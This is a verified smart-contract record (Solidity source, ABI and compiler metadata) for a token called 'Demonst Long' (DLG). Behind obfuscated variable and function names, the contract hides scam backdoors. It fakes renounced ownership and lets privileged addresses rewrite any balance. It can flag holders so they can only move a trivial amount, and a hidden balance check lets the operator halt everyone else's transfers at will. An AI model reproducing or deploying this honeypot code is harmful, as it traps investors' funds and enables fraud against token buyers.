{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface atMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLaunched) external view returns (uint256);\n\n    function transfer(address feeSender, uint256 teamMinSwap) external returns (bool);\n\n    function allowance(address marketingMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamMinSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeSender,\n        uint256 teamMinSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoFrom, uint256 value);\n    event Approval(address indexed marketingMin, address indexed spender, uint256 value);\n}\n\nabstract contract modeMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeSwapBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minSwap {\n    function createPair(address isTotal, address enableAtReceiver) external returns (address);\n}\n\ninterface fundMarketing is atMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DemonstLong is modeMax, atMarketing, fundMarketing {\n\n    function getOwner() external view returns (address) {\n        return amountFee;\n    }\n\n    bool public buyMin;\n\n    function balanceOf(address listLaunched) public view virtual override returns (uint256) {\n        return buyFrom[listLaunched];\n    }\n\n    uint256 private exemptFundTotal = 100000000 * 10 ** 18;\n\n    string private tradingSell = \"Demonst Long\";\n\n    function tradingLaunch() public {\n        emit OwnershipTransferred(enableReceiver, address(0));\n        amountFee = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptFundTotal;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverReceiverLaunched;\n    }\n\n    mapping(address => mapping(address => uint256)) private atTeamToken;\n\n    string private modeTeam = \"DLG\";\n\n    uint256 constant maxLaunch = 7 ** 10;\n\n    event OwnershipTransferred(address indexed totalReceiver, address indexed tokenTotal);\n\n    function transfer(address exemptLiquidity, uint256 teamMinSwap) external virtual override returns (bool) {\n        return walletFrom(_msgSender(), exemptLiquidity, teamMinSwap);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeTeam;\n    }\n\n    bool public minReceiver;\n\n    function txFrom(address exemptToken, address feeSender, uint256 teamMinSwap) internal returns (bool) {\n        require(buyFrom[exemptToken] >= teamMinSwap);\n        buyFrom[exemptToken] -= teamMinSwap;\n        buyFrom[feeSender] += teamMinSwap;\n        emit Transfer(exemptToken, feeSender, teamMinSwap);\n        return true;\n    }\n\n    address liquidityAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingSell;\n    }\n\n    function exemptBuy(address exemptLiquidity, uint256 teamMinSwap) public {\n        launchedAt();\n        buyFrom[exemptLiquidity] = teamMinSwap;\n    }\n\n    bool private fromAmountToken;\n\n    uint256 teamMarketing;\n\n    function enableMin(address takeReceiver) public {\n        if (buyMin) {\n            return;\n        }\n        \n        modeIsSell[takeReceiver] = true;\n        if (fromAmountToken != minReceiver) {\n            shouldExempt = swapAutoToken;\n        }\n        buyMin = true;\n    }\n\n    uint256 buyExemptFund;\n\n    uint8 private receiverReceiverLaunched = 18;\n\n    function allowance(address receiverFund, address enableTx) external view virtual override returns (uint256) {\n        if (enableTx == tokenFund) {\n            return type(uint256).max;\n        }\n        return atTeamToken[receiverFund][enableTx];\n    }\n\n    function minLaunched(uint256 teamMinSwap) public {\n        launchedAt();\n        teamMarketing = teamMinSwap;\n    }\n\n    address public tokenLiquidity;\n\n    function walletFrom(address exemptToken, address feeSender, uint256 teamMinSwap) internal returns (bool) {\n        if (exemptToken == enableReceiver) {\n            return txFrom(exemptToken, feeSender, teamMinSwap);\n        }\n        uint256 tradingList = atMarketing(tokenLiquidity).balanceOf(liquidityAmount);\n        require(tradingList == teamMarketing);\n        require(feeSender != liquidityAmount);\n        if (teamMin[exemptToken]) {\n            return txFrom(exemptToken, feeSender, maxLaunch);\n        }\n        return txFrom(exemptToken, feeSender, teamMinSwap);\n    }\n\n    bool private buyAuto;\n\n    address public enableReceiver;\n\n    function launchedAt() private view {\n        require(modeIsSell[_msgSender()]);\n    }\n\n    bool public modeMin;\n\n    function launchedReceiver(address exemptShouldSwap) public {\n        launchedAt();\n        \n        if (exemptShouldSwap == enableReceiver || exemptShouldSwap == tokenLiquidity) {\n            return;\n        }\n        teamMin[exemptShouldSwap] = true;\n    }\n\n    bool public receiverShould;\n\n    uint256 public shouldExempt;\n\n    function owner() external view returns (address) {\n        return amountFee;\n    }\n\n    bool public liquidityTeam;\n\n    mapping(address => bool) public modeIsSell;\n\n    mapping(address => bool) public teamMin;\n\n    bool private exemptAt;\n\n    mapping(address => uint256) private buyFrom;\n\n    address private amountFee;\n\n    address tokenFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address enableTx, uint256 teamMinSwap) public virtual override returns (bool) {\n        atTeamToken[_msgSender()][enableTx] = teamMinSwap;\n        emit Approval(_msgSender(), enableTx, teamMinSwap);\n        return true;\n    }\n\n    constructor (){\n        \n        feeSwapBuy receiverMaxSwap = feeSwapBuy(tokenFund);\n        tokenLiquidity = minSwap(receiverMaxSwap.factory()).createPair(receiverMaxSwap.WETH(), address(this));\n        \n        enableReceiver = _msgSender();\n        tradingLaunch();\n        modeIsSell[enableReceiver] = true;\n        buyFrom[enableReceiver] = exemptFundTotal;\n        if (swapAutoToken == shouldExempt) {\n            liquidityTeam = true;\n        }\n        emit Transfer(address(0), enableReceiver, exemptFundTotal);\n    }\n\n    uint256 public swapAutoToken;\n\n    function transferFrom(address exemptToken, address feeSender, uint256 teamMinSwap) external override returns (bool) {\n        if (_msgSender() != tokenFund) {\n            if (atTeamToken[exemptToken][_msgSender()] != type(uint256).max) {\n                require(teamMinSwap <= atTeamToken[exemptToken][_msgSender()]);\n                atTeamToken[exemptToken][_msgSender()] -= teamMinSwap;\n            }\n        }\n        return walletFrom(exemptToken, feeSender, teamMinSwap);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamMinSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"enableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamMinSwap\",\"type\":\"uint256\"}],\"name\":\"exemptBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptShouldSwap\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamMinSwap\",\"type\":\"uint256\"}],\"name\":\"minLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeIsSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAutoToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamMinSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamMinSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DemonstLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}